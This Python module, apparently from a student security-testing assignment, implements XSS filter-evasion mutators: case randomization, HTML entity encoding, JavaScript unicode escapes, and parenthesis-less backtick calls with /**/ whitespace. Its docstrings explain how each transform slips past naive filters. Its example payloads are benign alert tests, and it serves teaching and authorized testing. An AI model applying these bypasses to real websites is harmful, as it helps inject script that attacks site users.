"""
mutators.py
Owner: Member 2 (Bypass/Mutator Lead)

This is where the "advanced" part of the assignment lives - the
encoding/evasion transforms that turn a basic payload into something
that can slip past simple filters.

Implemented so far:
1. case_randomize()      - <ScRiPt> instead of <script>    [DONE]
2. html_entity_encode()  - &#x3C;script&#x3E;               [DONE]
3. unicode_encode()      - \u003Cscript\u003E (JS escapes)  [DONE]
4. filter_bypass_tricks()- backtick call + /**/ whitespace   [DONE]
5. event_handler_variant() - already covered as separate RAW payloads in
   payload_bank.py (onerror=/onmouseover=), no dedicated mutator needed

Reference for technique IDEAS (not for copy-pasting payload strings):
https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection
"""

import random


def case_randomize(payload: str) -> str:
    """
    Randomly upper/lower-cases each LETTER in the payload, leaving
    symbols like < > ( ) ' " unchanged.

    Why this works as a bypass: some naive filters only check for the
    exact lowercase string "<script>" - they miss "<ScRiPt>" even
    though browsers treat HTML tags as case-insensitive and will
    still execute it.

    Example: "<script>" -> "<ScRiPt>" (random each time you run it)
    """
    result_chars = []  # we build the new string one character at a time

    for c in payload:
        if c.isalpha():
            # It's a letter - randomly pick uppercase or lowercase version
            result_chars.append(random.choice([c.lower(), c.upper()]))
        else:
            # Not a letter (e.g. < > ( ) ' ") - leave it exactly as is
            result_chars.append(c)

    # Join the list of single characters back into one string
    return "".join(result_chars)


def html_entity_encode(payload: str) -> str:
    """
    Converts every character in the payload into its decimal HTML
    entity form, e.g. '<' becomes '&#60;' and 'a' becomes '&#97;'.

    Why this works as a bypass: many naive filters scan the RAW text
    for literal characters like "<" or keywords like "script". If the
    payload is written out as HTML entities instead, the filter sees
    harmless-looking text like "&#60;&#115;&#99;..." and lets it
    through. The BROWSER, however, decodes HTML entities back into
    real characters when it renders the page in an HTML context - so
    "&#60;" becomes "<" again at render time and the tag still executes.

    Note: this only works when the payload lands somewhere the browser
    HTML-decodes it (e.g. straight into the HTML body). It won't help
    inside a JS string context, since JS doesn't auto-decode HTML
    entities - that's a job for a different technique.

    Example: "<script>" -> "&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;"
    """
    result_chars = []

    for c in payload:
        # ord(c) converts the character to its numeric code point,
        # e.g. ord('<') == 60. We wrap that number in the HTML
        # decimal entity format: &#<number>;
        result_chars.append(f"&#{ord(c)};")

    return "".join(result_chars)


def unicode_encode(payload: str) -> str:
    """
    Converts every character in the payload into its JavaScript unicode
    escape form, e.g. '<' becomes '\\u003C' and 'a' becomes '\\u0061'.

    Why this works as a bypass: this one targets JS-context filters
    specifically (not HTML ones - that's html_entity_encode's job).
    Some naive filters scan for literal substrings like "<script" or
    "alert(" directly inside JavaScript code/strings. But the JS
    ENGINE itself understands \\uXXXX escapes as real characters when
    it parses the script - so "\\u003Cscript\\u003E" is executed by
    the browser exactly as if you'd typed "<script>", even though the
    filter never saw that literal text.

    format(ord(c), '04x') turns the character's code point into a
    4-digit hex string (padded with leading zeros), e.g. ord('<') is
    60, which in hex is '3c', padded to '003c'.

    Example: "<script>" -> "\\u003c\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003e"
    """
    result_chars = []

    for c in payload:
        # :04x means: hex format, lowercase, zero-padded to 4 digits
        result_chars.append(f"\\u{ord(c):04x}")

    return "".join(result_chars)


def filter_bypass_tricks(payload: str) -> str:
    """
    Applies two small, classic filter-bypass tricks at once, combining
    them with the previous techniques (unlike the encoders above, this
    one does string replacements rather than encoding every character):

    TRICK 1 - Parenthesis-less function calls (JS "tagged template"):
    Many naive filters specifically blacklist "(" and ")" because
    that's how function calls normally look, e.g. alert('XSS-test').
    But JavaScript has a feature called "tagged template literals"
    that lets you call a function using BACKTICKS instead of
    parentheses: alert`XSS-test` is valid JS and calls alert() with
    "XSS-test" as the argument - no parentheses needed at all.

    TRICK 2 - Comment-based whitespace:
    Some filters specifically block literal space characters (to stop
    multi-word payloads). Replacing spaces with a JS/CSS-style EMPTY
    COMMENT (/**/) still acts as a separator to the parser, but
    contains no literal space character for the filter to catch.

    Example: "alert('XSS-test')" -> "alert`XSS-test`" (no parens, no spaces)
    """
    # TRICK 1: turn "alert('XSS-test')" into "alert`XSS-test`"
    # - replace the opening  ('  with a backtick
    # - replace the closing  ')  with a backtick
    result = payload.replace("('", "`").replace("')", "`")

    # TRICK 2: replace any literal space with an empty comment, so a
    # filter looking for the space character " " won't find one
    result = result.replace(" ", "/**/")

    return result


def apply_mutation(payload: str, technique: str = "none") -> str:
    """
    Apply a bypass/encoding technique to a base payload.
    """
    if technique == "none":
        return payload

    if technique == "case_random":
        return case_randomize(payload)

    if technique == "html_entity":
        return html_entity_encode(payload)

    if technique == "unicode_encode":
        return unicode_encode(payload)

    if technique == "filter_bypass":
        return filter_bypass_tricks(payload)

    raise NotImplementedError(
        f"Mutation technique '{technique}' not implemented yet."
    )
